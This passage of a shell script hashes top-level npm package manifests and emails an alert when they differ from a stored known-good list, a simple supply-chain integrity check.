find node_modules/ -maxdepth 2 -name "package.json" -not -path "*/node_modules/*/node_modules/*" | while read pkg; do
  name=$(jq -r '.name' "$pkg")
  version=$(jq -r '.version' "$pkg")
  integrity=$(sha256sum "$pkg" | awk '{print $1}')
  echo "$integrity  $name@$version" >> "$TMP_HASHES"
done

# Compare with known-good hashes
if [ -f "$KNOWN_HASHES" ]; then
  CHANGES=$(diff "$KNOWN_HASHES" "$TMP_HASHES" | grep "^[<>]" | wc -l)
  if [ "$CHANGES" -gt 0 ]; then
    echo "ALERT: $CHANGES dependency changes detected in $PROJECT_DIR" | \
      mail -s "[SUPPLY CHAIN ALERT] Dependency integrity change detected" "$ALERT_EMAIL"
    diff "$KNOWN_HASHES" "$TMP_HASHES"
  fi
else
  echo "Initializing known-good hashes file"
  cp "$TMP_HASHES" "$KNOWN_HASHES"
fi
```
